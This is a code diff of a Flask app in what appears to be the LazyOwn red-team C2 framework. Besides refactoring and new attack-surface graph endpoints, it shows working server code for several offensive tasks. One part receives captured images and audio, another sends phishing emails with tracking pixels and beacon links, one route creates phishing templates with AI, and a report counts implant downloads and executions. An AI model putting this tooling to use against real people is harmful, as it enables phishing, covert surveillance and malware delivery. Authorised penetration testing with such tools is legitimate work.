+        if image_data.startswith("data:image/png;base64,"):
+            image_data = image_data.split(",")[1]
         image_bytes = base64.b64decode(image_data)
 
-
-        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
         filename = f"{SAVE_DIR}/capture_{timestamp}.png"
 
-
-        with open(filename, 'wb') as f:
+        with open(filename, "wb") as f:
             f.write(image_bytes)
 
         logging.info(f"Imagen guardada: {filename}")
         return jsonify({"status": "success", "message": "Imagen recibida y guardada"}), 200
-    except Exception as e:
-        logging.error(f"Error procesando imagen")
+    except Exception:
+        logging.error("Error procesando imagen")
         return jsonify({"error": str("audio")}), 500
 
-@app.route('/audio', methods=['POST'])
+
+@app.route("/audio", methods=["POST"])
 def capture_audio():
     try:
-        if 'audio' not in request.files:
+        if "audio" not in request.files:
             logging.error("Solicitud sin datos de audio")
             return jsonify({"error": "No se proporcionó audio"}), 400
-        audio_file = request.files['audio']
-        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+        audio_file = request.files["audio"]
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
         filename = f"{SAVE_DIR}/audio_{timestamp}.webm"
         audio_file.save(filename)
         logging.info(f"Audio guardado: {filename}")
         return jsonify({"status": "success", "message": "Audio recibido y guardado"}), 200
-    except Exception as e:
-        logging.error(f"Error procesando audio")
+    except Exception:
+        logging.error("Error procesando audio")
         return jsonify({"error": str("audio")}), 500
 
-@app.route('/surface')
+
+@app.route("/surface")
+@requires_auth_or_session
 def surface():
-    return render_template('surface.html')
+    return render_template("surface.html")
 
 
-@app.route('/surface_live')
+@app.route("/surface_live")
+@requires_auth_or_session
 def surface_live():
     """Render the live attack-surface graph page.
 
@@ -4818,10 +7366,11 @@ def surface_live():
     response = decoy()
     if response:
         return response
-    return render_template('surface_live.html')
+    return render_template("surface_live.html")
 
 
-@app.route('/api/surface_live')
+@app.route("/api/surface_live")
+@requires_auth_or_session
 def api_surface_live():
     """Return the live attack-surface graph derived from the world model.
 
@@ -4836,43 +7385,510 @@ def api_surface_live():
     response = decoy()
     if response:
         return response
-    world_path = os.path.join(SESSIONS_DIR, 'world_model.json')
-    try:
-        with open(world_path, 'r', encoding='utf-8') as fh:
-            world = json.load(fh)
-    except (OSError, json.JSONDecodeError):
-        world = {}
+    from modules.world_model import read_state_dict
+
+    world = read_state_dict(os.path.join(SESSIONS_DIR, "world_model.json"))
     return jsonify(build_live_graph(world))
 
-@app.route('/data')
+
+@app.route("/intel")
+@login_required
+def intel_view():
+    """Render the fused sessions intel graph page (ReadMenator engine).
+
+    Data loads via ``/api/intel_graph`` inside LazyOwn chrome. Defaults to
+    the 2D map with fit-to-view; 3D orbit, clusters, layers, tree and the
+    circular/spherical bundles stay one click away.
+
+    Returns:
+        The decoy response for unauthorized origins, otherwise the
+        ``intel.html`` explorer embedded in the LazyOwn layout.
+    """
+    response = decoy()
+    if response:
+        return response
+    return render_template("intel.html")
+
+
+@app.route("/intel_bundle")
+@login_required
+def intel_bundle_view():
+    """Render the circular/spherical bundle view of the intel graph.
+
+    Returns:
+        The decoy response for unauthorized origins, otherwise the
+        ``intel_bundle.html`` explorer embedded in the LazyOwn layout.
+    """
+    response = decoy()
+    if response:
+        return response
+    return render_template("intel_bundle.html")
+
+
+@app.route("/attack3d")
+@login_required
+def attack3d_view():
+    """Render the C2-centred attack-surface graph (ReadMenator engine).
+
+    Shows the LazyOwn C2 root, implants, discovered machines, open ports,
+    services, findings and objectives fused from every session artefact.
+    The current ``/graph`` and ``/surface`` views stay untouched.
+
+    Returns:
+        The decoy response for unauthorized origins, otherwise the
+        ``attack3d.html`` explorer embedded in the LazyOwn layout.
+    """
+    response = decoy()
+    if response:
+        return response
+    return render_template("attack3d.html")
+
+
+@app.route("/attack_bundle")
+@login_required
+def attack_bundle_view():
+    """Render the circular/spherical bundle view of the attack surface.
+
+    Returns:
+        The decoy response for unauthorized origins, otherwise the
+        ``attack_bundle.html`` explorer embedded in the LazyOwn layout.
+    """
+    response = decoy()
+    if response:
+        return response
+    return render_template("attack_bundle.html")
+
+
+@app.route("/api/intel_graph")
+@login_required
+def api_intel_graph():
+    """Return the fused C2-centred intel graph with precomputed layout.
+
+    Query param ``layout`` selects ``force`` (default, physics runs
+    client-side, no preset positions so every graph fits on screen),
+    ``cluster``, ``radial``, ``dag`` (same, client-side), ``circular`` or
+    ``spherical`` (server-side positions). Legacy ``force2d``/``force3d``
+    still map to ``force``. Every request also refreshes
+    ``sessions/intel_summary.json`` so the autonomous loop planner scores
+    probes from current campaign state.
+
+    Returns:
+        A JSON object with ``nodes``, ``edges``, ``stats``, ``settings``
+        and ``analytics`` keys.
+    """
+    response = decoy()
+    if response:
+        return response
+    from modules.intel_fusion import (
+        assign_layout,
+        build_analytics,
+        build_intel_graph,
+        page_settings,
+        write_summary,
+    )
+
+    layout = (request.args.get("layout", "force") or "force").lower()
+    if layout in ("force2d", "force3d"):
+        layout = "force"
+    if layout not in ("force", "cluster", "radial", "dag", "circular", "spherical"):
+        layout = "force"
+    try:
+        graph = build_intel_graph(SESSIONS_DIR)
+    except Exception:
+        graph = {"nodes": [], "edges": [], "stats": {}}
+    try:
+        graph = assign_layout(graph, layout)
+    except Exception:
+        pass
+    try:
+        graph["intel"] = write_summary(graph, SESSIONS_DIR)
+    except Exception:
+        graph["intel"] = {}
+    try:
+        graph["settings"] = page_settings(graph)
+    except Exception:
+        graph["settings"] = {}
+    try:
+        graph["analytics"] = build_analytics(graph, graph.get("intel", {}))
+    except Exception:
+        graph["analytics"] = {}
+    return jsonify(graph)
+
+
+@app.route("/broadcast")
+@login_required
+def broadcast_view():
+    """Render the exploration timeline board for one loop task.
+
+    Returns:
+        The ``broadcast.html`` timeline embedded in the LazyOwn layout.
+    """
+    response = decoy()
+    if response:
+        return response
+    return render_template("broadcast.html")
+
+
+@app.route("/api/loop_broadcast/stream")
+@login_required
+def api_loop_broadcast_stream():
+    """SSE live tail of one loop task's activity stream.
+
+    Query params ``task`` (required), ``cursor`` (resume line index),
+    ``interval`` (poll seconds, 0.2..5) and ``seconds`` (stream
+    lifetime, max 1800). Every event carries ``id: <cursor>`` so an
+    operator reconnects without gaps after a page reload.
+
+    Returns:
+        ``text/event-stream`` response with keep-alive comments.
+    """
+    response = decoy()
+    if response:
+        return response
+    from modules.lazy_loop import LazyLoopEngine
+
+    task_id = (request.args.get("task", "") or "").strip()
+    if not task_id:
+        return jsonify({"error": "task is required"}), 400
+    try:
+        cursor = max(0, int(request.args.get("cursor", "0") or 0))
+    except ValueError:
+        cursor = 0
+    try:
+        interval = min(5.0, max(0.2, float(request.args.get("interval", "0.5") or 0.5)))
+    except ValueError:
+        interval = 0.5
+    try:
+        seconds = min(1800.0, max(2.0, float(request.args.get("seconds", "300") or 300)))
+    except ValueError:
+        seconds = 300.0
+    engine = LazyLoopEngine()
+
+    def _events():
+        state = {"cursor": cursor}
+        deadline = time.time() + seconds
+        while time.time() < deadline:
+            try:
+                result = engine.broadcast_events(task_id, cursor=state["cursor"])
+            except Exception as exc:
+                logger.debug("broadcast_events failed: %s", type(exc).__name__)
+                yield f"event: error\ndata: {json.dumps({'error': 'event stream failed'})}\n\n"
+                return
+            for record in result["items"]:
+                state["cursor"] += 1
+                yield f"id: {state['cursor']}\ndata: {json.dumps(record, ensure_ascii=False)}\n\n"
+            yield ": keep-alive\n\n"
+            time.sleep(interval)
+
+    return Response(
+        _events(),
+        mimetype="text/event-stream",
+        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no", "Connection": "keep-alive"},
+    )
+
+
+@app.route("/api/loop_broadcast")
+@login_required
+def api_loop_broadcast():
+    """Return the paginated exploration timeline for one loop task.
+
+    Query params ``task`` (required), ``kind`` (repeatable),
+    ``q``, ``order`` (asc/desc), ``page``, ``per_page``. Rows carry
+    upstream/downstream neighbours and anchored assets inline so the
+    board expands without extra requests.
+
+    Returns:
+        A JSON object with ``items``, ``total``, ``page``,
+        ``per_page``, ``has_more`` and ``days`` keys.
+    """
+    response = decoy()
+    if response:
+        return response
+    from modules.lazy_loop import LazyLoopEngine
+
+    task_id = (request.args.get("task", "") or "").strip()
+    if not task_id:
+        return jsonify({"error": "task is required"}), 400
+    kinds = [k for k in request.args.getlist("kind") if k]
+    query = request.args.get("q", "") or ""
+    order = (request.args.get("order", "desc") or "desc").lower()
+    try:
+        page = max(1, int(request.args.get("page", "1") or 1))
+    except ValueError:
+        page = 1
+    try:
+        per_page = max(1, min(100, int(request.args.get("per_page", "20") or 20)))
+    except ValueError:
+        per_page = 20
+    try:
+        result = LazyLoopEngine().broadcast(
+            task_id, kinds=kinds or None, query=query, order=order, page=page, per_page=per_page
+        )
+    except Exception as exc:
+        logger.debug("loop broadcast failed: %s", type(exc).__name__)
+        return jsonify({"error": "broadcast unavailable"}), 404
+    return jsonify(result)
+
+
+@app.route("/api/guard_audit")
+@login_required
+def api_guard_audit():
+    """Return guard history with pending approvals kept independent.
+
+    Query params ``task``, ``action``, ``source``, ``q``, ``limit``,
+    ``lookup`` (a ``tool_use_id`` jumping to the exact execution).
+    Pending intercept requests always ride along unpaginated so paging
+    through history never hides work waiting for approval.
+
+    Returns:
+        A JSON object with ``pending``, ``history`` and optional
+        ``lookup`` keys.
+    """
+    response = decoy()
+    if response:
+        return response
+    from modules.lazy_loop import Guard, InterceptQueue
+
+    task_id = (request.args.get("task", "") or "").strip()
+    guard = Guard(task_id)
+    try:
+        limit = max(1, min(500, int(request.args.get("limit", "50") or 50)))
+    except ValueError:
+        limit = 50
+    history = guard.audit(
+        limit=limit,
+        action=request.args.get("action", "") or "",
+        source=request.args.get("source", "") or "",
+        query=request.args.get("q", "") or "",
+    )
+    try:
+        pending = InterceptQueue(task_id).pending()
+    except Exception:
+        pending = []
+    payload: dict = {"pending": pending, "history": history}
+    lookup_id = (request.args.get("lookup", "") or "").strip()
+    if lookup_id:
+        try:
+            payload["lookup"] = guard.lookup(lookup_id)
+        except KeyError as exc:
+            logger.debug("guard lookup failed: %s", type(exc).__name__)
+            return jsonify({"error": "lookup not found"}), 404
+    return jsonify(payload)
+
+
+@app.route("/api/loop_graph")
+@login_required
+def api_loop_graph():
+    """Return one loop task as ForceGraph-ready nodes/links plus context.
+
+    Query param ``task`` (required). Nodes carry exploration kind/state
+    and asset kind/value; links keep exploration kinds plus ``anchors``
+    edges into assets. ``context`` holds hubs, islands and suggested
+    next probes computed from the same topology the planner ranks on.
+
+    Returns:
+        A JSON object with ``nodes``, ``links`` and ``context`` keys.
+    """
+    response = decoy()
+    if response:
+        return response
+    from modules.lazy_loop import LazyLoopEngine
+
+    task_id = (request.args.get("task", "") or "").strip()
+    if not task_id:
+        return jsonify({"error": "task is required"}), 400
+    try:
+        engine = LazyLoopEngine()
+        graph = engine.loop_graph(task_id)
+        graph["context"] = engine.graph_context(task_id)
+    except Exception as exc:
+        logger.debug("loop graph failed: %s", type(exc).__name__)
+        return jsonify({"error": "graph unavailable"}), 404
+    return jsonify(graph)
+
+
+@app.route("/api/lazy_mentions")
+@login_required
+def api_lazy_mentions():
+    """Search @ mention candidates with scroll pagination.
+
+    Query params ``kind``, ``q`` and ``cursor`` (opaque page position
+    from the previous page). Returns ``items`` plus ``next_cursor``.
+
+    Returns:
+        A JSON object with ``items`` and ``next_cursor`` keys.
+    """
+    response = decoy()
+    if response:
+        return response
+    from modules.lazy_mentions import InvalidCursor, search_mentions_page
+
+    try:
+        page = search_mentions_page(
+            request.args.get("kind", "") or "",
+            request.args.get("q", "") or "",
+            request.args.get("cursor", "") or "",
+        )
+    except InvalidCursor as exc:
+        logger.debug("mentions page failed: %s", type(exc).__name__)
+        return jsonify({"error": "invalid cursor"}), 400
+    except ValueError as exc:
+        logger.debug("mentions search failed: %s", type(exc).__name__)
+        return jsonify({"error": "search unavailable"}), 400
+    return jsonify(
+        {
+            "items": [{"kind": i.kind, "id": i.id, "label": i.label, "description": i.description} for i in page.items],
+            "next_cursor": page.next_cursor,
+        }
+    )
+
+
+@app.route("/api/intel_bundle")
+@login_required
+def api_intel_bundle():
+    """Return the circular/spherical bundle payload of the intel graph.
+
+    Returns:
+        A JSON object with ``bundle`` (nodes, groups, edges) and
+        ``settings`` keys consumed by ``intel_bundle.html``.
+    """
+    response = decoy()
+    if response:
+        return response
+    from modules.intel_fusion import (
+        build_bundle_payload,
+        build_intel_graph,
+        bundle_settings,
+    )
+
+    try:
+        graph = build_intel_graph(SESSIONS_DIR)
+    except Exception:
+        graph = {"nodes": [], "edges": [], "stats": {}}
+    try:
+        bundle = build_bundle_payload(graph)
+    except Exception:
+        bundle = {"nodes": [], "groups": [], "edges": []}
+    try:
+        settings = bundle_settings(graph)
+    except Exception:
+        settings = {}
+    return jsonify({"bundle": bundle, "settings": settings})
+
+
+@app.route("/api/attack_graph")
+@login_required
+def api_attack_graph():
+    """Return the fused C2-centred attack-surface graph.
+
+    Merges live surface scans (C2, implants, hosts, ports, services) with
+    campaign intel (objectives, findings, tasks, log mentions). Query param
+    ``layout`` accepts ``force`` (default, client-side physics),
+    ``cluster``, ``radial``, ``dag``, ``circular`` and ``spherical``.
+    Every request refreshes ``sessions/intel_summary.json`` so the
+    autonomous loop scores probes from current campaign state.
+
+    Returns:
+        A JSON object with ``nodes``, ``edges``, ``stats``, ``settings``
+        and ``analytics`` keys.
+    """
+    response = decoy()
+    if response:
+        return response
+    from modules.attack_surface3d import build_attack_graph, refresh_summary
+    from modules.intel_fusion import (
+        assign_layout,
+        build_analytics,
+        page_settings,
+    )
+
+    layout = (request.args.get("layout", "force") or "force").lower()
+    if layout not in ("force", "cluster", "radial", "dag", "circular", "spherical"):
+        layout = "force"
+    try:
+        graph = build_attack_graph(SESSIONS_DIR)
+    except Exception:
+        graph = {"nodes": [], "edges": [], "stats": {}}
+    try:
+        graph = assign_layout(graph, layout)
+    except Exception:
+        pass
+    try:
+        graph["intel"] = refresh_summary(graph, SESSIONS_DIR)
+    except Exception:
+        graph["intel"] = {}
+    try:
+        graph["settings"] = page_settings(graph)
+    except Exception:
+        graph["settings"] = {}
+    try:
+        graph["analytics"] = build_analytics(graph, graph.get("intel", {}))
+    except Exception:
+        graph["analytics"] = {}
+    return jsonify(graph)
+
+
+@app.route("/api/attack_bundle")
+@login_required
+def api_attack_bundle():
+    """Return the circular/spherical bundle payload of the attack surface.
+
+    Returns:
+        A JSON object with ``bundle`` (nodes, groups, edges) and
+        ``settings`` keys consumed by ``attack_bundle.html``.
+    """
+    response = decoy()
+    if response:
+        return response
+    from modules.attack_surface3d import build_attack_graph
+    from modules.intel_fusion import build_bundle_payload, bundle_settings
+
+    try:
+        graph = build_attack_graph(SESSIONS_DIR)
+    except Exception:
+        graph = {"nodes": [], "edges": [], "stats": {}}
+    try:
+        bundle = build_bundle_payload(graph)
+    except Exception:
+        bundle = {"nodes": [], "groups": [], "edges": []}
+    try:
+        settings = bundle_settings(graph)
+    except Exception:
+        settings = {}
+    return jsonify({"bundle": bundle, "settings": settings})
+
+
+@app.route("/data")
+@requires_auth_or_session
 def get_data():
-    shell.onecmd('process_scans')
+    shell.onecmd("process_scans")
     data = load_data()
     if not data:
         return jsonify({"error": "No se pudo cargar data.json"}), 500
     return jsonify(data)
 
-@app.route('/upload_zip', methods=['POST'])
+
+@app.route("/upload_zip", methods=["POST"])
 def upload_zip_file():
     """Handles the file upload, processes the BloodHound ZIP, and prepares data for visualization."""
-    if 'file' not in request.files:
-        return render_template('index.html', error="No file part")
-    file = request.files['file']
-    if file.filename == '':
-        return render_template('index.html', error="No selected file")
+    if "file" not in request.files:
+        return render_template("index.html", error="No file part")
+    file = request.files["file"]
+    if file.filename == "":
+        return render_template("index.html", error="No selected file")
 
-    if not file.filename.lower().endswith('.zip'):
-        return render_template('index.html', error="Only ZIP files are allowed")
+    if not file.filename.lower().endswith(".zip"):
+        return render_template("index.html", error="Only ZIP files are allowed")
 
-    os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
+    os.makedirs(app.config["UPLOAD_FOLDER"], exist_ok=True)
 
     unique_filename = f"{uuid.uuid4().hex}.zip"
-    filepath = os.path.join(app.config['UPLOAD_FOLDER'], unique_filename)
+    filepath = os.path.join(app.config["UPLOAD_FOLDER"], unique_filename)
 
-    abs_upload_folder = os.path.abspath(app.config['UPLOAD_FOLDER'])
+    abs_upload_folder = os.path.abspath(app.config["UPLOAD_FOLDER"])
     abs_filepath = os.path.abspath(filepath)
     if not abs_filepath.startswith(abs_upload_folder):
-        return render_template('index.html', error="Invalid file path")
+        return render_template("index.html", error="Invalid file path")
 
     try:
         file.save(filepath)
@@ -4881,126 +7897,130 @@ def upload_zip_file():
 
         try:
             os.remove(filepath)
-        except Exception as e:
+        except Exception:
             if config.enable_c2_debug:
                 logger.info(f"Error removing file: {str('')}")
 
         if error_message:
             if config.enable_c2_debug:
                 logger.info(f"Error during processing: {error_message}")
-            return render_template('index.html', error=error_message)
+            return render_template("index.html", error=error_message)
 
         if not nodes and not edges:
-            return render_template('index.html', error="No valid data extracted from the ZIP")
+            return render_template("index.html", error="No valid data extracted from the ZIP")
 
         if config.enable_c2_debug:
             logger.info(f"Nodes extracted: {len(nodes)}")
             logger.info(f"Edges extracted: {len(edges)}")
             logger.info(f"Attack vectors extracted: {len(ad_data)}")
-        return render_template('surface.html', nodes=nodes, edges=edges, ad_data=ad_data)
+        return render_template("surface.html", nodes=nodes, edges=edges, ad_data=ad_data)
 
-    except Exception as e:
+    except Exception:
         if os.path.exists(filepath):
             try:
                 os.remove(filepath)
-            except Exception as cleanup_error:
+            except Exception:
                 if config.enable_c2_debug:
                     logger.info(f"Error removing file during cleanup: {str('')}")
-        return render_template('index.html', error=f"Error processing file: {str('')}")
+        return render_template("index.html", error=f"Error processing file: {str('')}")
 
-@phishing_bp.route('/phishing/campaigns', methods=['GET'])
+
+@phishing_bp.route("/phishing/campaigns", methods=["GET"])
 @login_required
 def list_campaigns():
     campaigns = []
     for filename in os.listdir(CAMPAIGNS_DIR):
-        if filename.endswith('.yaml'):
+        if filename.endswith(".yaml"):
             campaign = load_yaml_safely(os.path.join(CAMPAIGNS_DIR, filename))
             if campaign:
-                campaign['id'] = filename.replace('.yaml', '')
+                campaign["id"] = filename.replace(".yaml", "")
                 campaigns.append(campaign)
-    return render_template('phishing/campaigns.html', campaigns=campaigns)
+    return render_template("phishing/campaigns.html", campaigns=campaigns)
 
-@phishing_bp.route('/phishing/campaigns/new', methods=['GET', 'POST'])
+
+@phishing_bp.route("/phishing/campaigns/new", methods=["GET", "POST"])
 @login_required
 def create_campaign():
-    if request.method == 'POST':
+    if request.method == "POST":
         data = request.form
         campaign_id = str(uuid.uuid4())
 
-        if not data.get('name') or not data.get('template') or not data.get('recipients'):
-            flash('Name, template, and recipients are required.', 'error')
-            return redirect(url_for('phishing.create_campaign'))
+        if not data.get("name") or not data.get("template") or not data.get("recipients"):
+            flash("Name, template, and recipients are required.", "error")
+            return redirect(url_for("phishing.create_campaign"))
 
-        beacon_url = data.get('beacon_url', '')
+        beacon_url = data.get("beacon_url", "")
         if not beacon_url:
             logger.warning(f"Campaign {campaign_id} created with empty beacon_url")
             short_url = secrets.token_urlsafe(6)
             short_urls = load_short_urls()
             short_urls[short_url] = {
-                'original_url': f'http://{request.host}/track/{short_url}',
-                'active': True,
-                'created_at': datetime.now().isoformat()
+                "original_url": f"http://{request.host}/track/{short_url}",
+                "active": True,
+                "created_at": datetime.now().isoformat(),
             }
             save_short_urls(short_urls)
-            beacon_url = f'http://{request.host}/{short_url}'
+            beacon_url = f"http://{request.host}/{short_url}"
 
         campaign = {
-            'name': data['name'],
-            'template': data['template'],
-            'recipients': [r.strip() for r in data['recipients'].split(',')],
-            'beacon_url': beacon_url,
-            'created_at': datetime.now(timezone.utc).isoformat()
+            "name": data["name"],
+            "template": data["template"],
+            "recipients": [r.strip() for r in data["recipients"].split(",")],
+            "beacon_url": beacon_url,
+            "created_at": datetime.now(timezone.utc).isoformat(),
         }
         try:
-            with open(os.path.join(CAMPAIGNS_DIR, f'{campaign_id}.yaml'), 'w') as f:
+            with open(os.path.join(CAMPAIGNS_DIR, f"{campaign_id}.yaml"), "w") as f:
                 yaml.safe_dump(campaign, f)
             logger.info(f"Campaign {campaign_id} saved successfully")
         except Exception as e:
             logger.error(f"Error saving campaign {campaign_id}: {e}")
-            flash('Failed to save campaign.', 'error')
-            return redirect(url_for('phishing.create_campaign'))
+            flash("Failed to save campaign.", "error")
+            return redirect(url_for("phishing.create_campaign"))
 
         try:
             template_file = os.path.join(TEMPLATES_DIR, f"{campaign['template']}.yaml")
             template = load_yaml_safely(template_file)
             if not template:
-                flash('Invalid email template.', 'error')
-                return redirect(url_for('phishing.create_campaign'))
+                flash("Invalid email template.", "error")
+                return redirect(url_for("phishing.create_campaign"))
 
             with yagmail.SMTP(GMAIL_ADDRESS, GMAIL_APP_PASSWORD) as yag:
-                for recipient in campaign['recipients']:
-                    tracking_url = url_for('phishing.track_pixel', campaign_id=campaign_id, email=recipient, _external=True)
-                    html_body = template['body'].format(
-                        name=recipient.split('@')[0],
-                        beacon_url=campaign['beacon_url'],
-                        tracking_pixel=f'<img src="{tracking_url}" width="1" height="1" alt="" />'
+                for recipient in campaign["recipients"]:
+                    tracking_url = url_for(
+                        "phishing.track_pixel", campaign_id=campaign_id, email=recipient, _external=True
                     )
-                    yag.send(
-                        to=recipient,
-                        subject=template['subject'],
-                        contents=html_body
+                    html_body = template["body"].format(
+                        name=recipient.split("@")[0],
+                        beacon_url=campaign["beacon_url"],
+                        tracking_pixel=f'<img src="{tracking_url}" width="1" height="1" alt="" />',
                     )
+                    yag.send(to=recipient, subject=template["subject"], contents=html_body)
                     logger.info(f"Sent email to {recipient} for campaign {campaign_id}")
 
                     conn = sqlite3.connect(DB_PATH)
-                    conn.execute('INSERT INTO tracking VALUES (?, ?, ?, ?, ?)',
-                                 (campaign_id, recipient, 'sent', request.remote_addr, datetime.now().isoformat()))
+                    conn.execute(
+                        "INSERT INTO tracking VALUES (?, ?, ?, ?, ?)",
+                        (campaign_id, recipient, "sent", request.remote_addr, datetime.now().isoformat()),
+                    )
                     conn.commit()
                     conn.close()
 
-            flash(f"Campaign {campaign['name']} sent to {len(campaign['recipients'])} recipients.", 'success')
-            return redirect(url_for('phishing.list_campaigns'))
+            flash(f"Campaign {campaign['name']} sent to {len(campaign['recipients'])} recipients.", "success")
+            return redirect(url_for("phishing.list_campaigns"))
         except Exception as e:
             logger.error(f"Error sending campaign {campaign_id}: {e}")
-            flash('Failed to send campaign emails.', 'error')
-            return redirect(url_for('phishing.create_campaign'))
-    templates = [f.replace('.yaml', '') for f in os.listdir(TEMPLATES_DIR) if f.endswith('.yaml')]
-    return render_template('phishing/new_campaign.html', templates=templates)
+            flash("Failed to send campaign emails.", "error")
+            return redirect(url_for("phishing.create_campaign"))
+    templates = [f.replace(".yaml", "") for f in os.listdir(TEMPLATES_DIR) if f.endswith(".yaml")]
+    return render_template("phishing/new_campaign.html", templates=templates)
 
-@app.route('/lazyphishingai', methods=['POST'])
+
+@app.route("/lazyphishingai", methods=["POST"])
+@requires_auth_or_session
 def lazyphishingai():
     data = request.json
-    prompt = data.get('prompt')
+    prompt = data.get("prompt")
     timestamp = time.time()
     OUTPUT_FILE_YAML = TEMPLATES_DIR + f"/ai_template_{timestamp}.yaml"
     if not prompt:
@@ -5012,304 +8032,338 @@ def lazyphishingai():
     response = process_prompt_local_yaml(prompt, False, "web", OUTPUT_FILE_YAML)
     return response
 
-@phishing_bp.route('/phishing/<campaign_id>/track/<email>')
+
+@phishing_bp.route("/phishing/<campaign_id>/track/<email>")
 def track_pixel(campaign_id, email):
     """Píxel de seguimiento para registrar aperturas."""
     conn = sqlite3.connect(DB_PATH)
-    conn.execute('INSERT INTO tracking VALUES (?, ?, ?, ?, ?)',
-                 (campaign_id, email, 'opened', request.remote_addr, datetime.now(timezone.utc).replace(tzinfo=None).isoformat()))
+    conn.execute(
+        "INSERT INTO tracking VALUES (?, ?, ?, ?, ?)",
+        (
+            campaign_id,
+            email,
+            "opened",
+            request.remote_addr,
+            datetime.now(timezone.utc).replace(tzinfo=None).isoformat(),
+        ),
+    )
     conn.commit()
     conn.close()
 
-    with open(os.path.join(os.getcwd(), 'static', 'images', 'pixel.png'), 'rb') as f:
-        return f.read(), 200, {'Content-Type': 'image/png'}
+    with open(os.path.join(os.getcwd(), "static", "images", "pixel.png"), "rb") as f:
+        return f.read(), 200, {"Content-Type": "image/png"}
 
-@phishing_bp.route('/phishing/<campaign_id>/report')
+
+@phishing_bp.route("/phishing/<campaign_id>/report")
 @login_required
 def campaign_report(campaign_id):
-    campaign_file = os.path.join(CAMPAIGNS_DIR, f'{campaign_id}.yaml')
+    campaign_file = os.path.join(CAMPAIGNS_DIR, f"{campaign_id}.yaml")
     campaign = load_yaml_safely(campaign_file)
     if not campaign:
         abort(404)
-    campaign['id'] = campaign_id
+    campaign["id"] = campaign_id
 
     short_urls = load_short_urls()
-    beacon_url = campaign.get('beacon_url', '') if 'vectors' not in campaign else ''
-    beacon_short_url = urlparse(beacon_url).path.lstrip('/') if beacon_url else ''
+    beacon_url = campaign.get("beacon_url", "") if "vectors" not in campaign else ""
+    beacon_short_url = urlparse(beacon_url).path.lstrip("/") if beacon_url else ""
 
     conn = sqlite3.connect(DB_PATH)
     cursor = conn.cursor()
-    cursor.execute('SELECT event, COUNT(*) FROM tracking WHERE campaign_id = ? GROUP BY event', (campaign_id,))
+    cursor.execute("SELECT event, COUNT(*) FROM tracking WHERE campaign_id = ? GROUP BY event", (campaign_id,))
     stats = {row[0]: row[1] for row in cursor.fetchall()}
-    cursor.execute('SELECT email, event, ip, timestamp FROM tracking WHERE campaign_id = ? ORDER BY timestamp DESC', (campaign_id,))
-    events = [{'email': row[0], 'event': row[1], 'ip': row[2], 'timestamp': row[3]} for row in cursor.fetchall()]
-    cursor.execute('SELECT email, event_type, ip, user_agent, timestamp, behavior_data FROM behavioral_tracking WHERE campaign_id = ? OR short_url = ? ORDER BY timestamp DESC', (campaign_id, beacon_short_url))
-    behavioral_events = [{'email': row[0], 'event_type': row[1], 'ip': row[2], 'user_agent': row[3], 'timestamp': row[4], 'behavior_data': row[5]} for row in cursor.fetchall()]
-    cursor.execute('SELECT email, event_type, ip, timestamp FROM multivector_tracking WHERE campaign_id = ? ORDER BY timestamp DESC', (campaign_id,))
-    multivector_events = [{'email': row[0], 'event_type': row[1], 'ip': row[2], 'timestamp': row[3]} for row in cursor.fetchall()]
+    cursor.execute(
+        "SELECT email, event, ip, timestamp FROM tracking WHERE campaign_id = ? ORDER BY timestamp DESC", (campaign_id,)
+    )
+    events = [{"email": row[0], "event": row[1], "ip": row[2], "timestamp": row[3]} for row in cursor.fetchall()]
+    cursor.execute(
+        "SELECT email, event_type, ip, user_agent, timestamp, behavior_data FROM behavioral_tracking WHERE campaign_id = ? OR short_url = ? ORDER BY timestamp DESC",
+        (campaign_id, beacon_short_url),
+    )
+    behavioral_events = [
+        {
+            "email": row[0],
+            "event_type": row[1],
+            "ip": row[2],
+            "user_agent": row[3],
+            "timestamp": row[4],
+            "behavior_data": row[5],
+        }
+        for row in cursor.fetchall()
+    ]
+    cursor.execute(
+        "SELECT email, event_type, ip, timestamp FROM multivector_tracking WHERE campaign_id = ? ORDER BY timestamp DESC",
+        (campaign_id,),
+    )
+    multivector_events = [
+        {"email": row[0], "event_type": row[1], "ip": row[2], "timestamp": row[3]} for row in cursor.fetchall()
+    ]
     conn.close()
 
     download_events = []
     execution_events = []
     if beacon_short_url:
         download_events = parse_access_log_for_short_url(beacon_short_url)
-        stats['downloaded'] = len(download_events)
-        stats['interactions'] = len(behavioral_events) + len(multivector_events)
-        original_url = short_urls.get(beacon_short_url, {}).get('original_url', 'Unknown')
+        stats["downloaded"] = len(download_events)
+        stats["interactions"] = len(behavioral_events) + len(multivector_events)
+        original_url = short_urls.get(beacon_short_url, {}).get("original_url", "Unknown")
         for event in download_events:
-            event['original_url'] = original_url
-        implante = short_urls.get(beacon_short_url, {}).get('original_url', '').split('/')[-1].replace('.exe', '')
+            event["original_url"] = original_url
+        implante = short_urls.get(beacon_short_url, {}).get("original_url", "").split("/")[-1].replace(".exe", "")
         if implante:
             implant_config = load_implant_config(implante)
-            if implant_config.get('name') == implante:
+            if implant_config.get("name") == implante:
                 execution_events = parse_execution_log(implante)
-                stats['executed'] = len(execution_events)
+                stats["executed"] = len(execution_events)
 
-    if 'vectors' in campaign:
-        for vector_type, vector_data in campaign['vectors'].items():
-            beacon_url = vector_data.get('beacon_url', '')
+    if "vectors" in campaign:
+        for vector_type, vector_data in campaign["vectors"].items():
+            beacon_url = vector_data.get("beacon_url", "")
             if beacon_url:
-                beacon_short_url = urlparse(beacon_url).path.lstrip('/')
+                beacon_short_url = urlparse(beacon_url).path.lstrip("/")
                 download_events.extend(parse_access_log_for_short_url(beacon_short_url))
-                stats['downloaded'] = len(download_events)
+                stats["downloaded"] = len(download_events)
 
     behavioral_analysis = analyze_behavioral_data(behavioral_events)
-    return render_template('phishing/report.html',
-                         campaign=campaign,
-                         stats=stats,
-                         events=events,
-                         download_events=download_events,
-                         execution_events=execution_events,
-                         behavioral_analysis=behavioral_analysis,
-                         multivector_events=multivector_events)
+    return render_template(
+        "phishing/report.html",
+        campaign=campaign,
+        stats=stats,
+        events=events,
+        download_events=download_events,
+        execution_events=execution_events,
+        behavioral_analysis=behavioral_analysis,
+        multivector_events=multivector_events,
+    )
 
-@phishing_bp.route('/phishing/<campaign_id>/orchestrate', methods=['GET', 'POST'])
+
+@phishing_bp.route("/phishing/<campaign_id>/orchestrate", methods=["GET", "POST"])
 @login_required
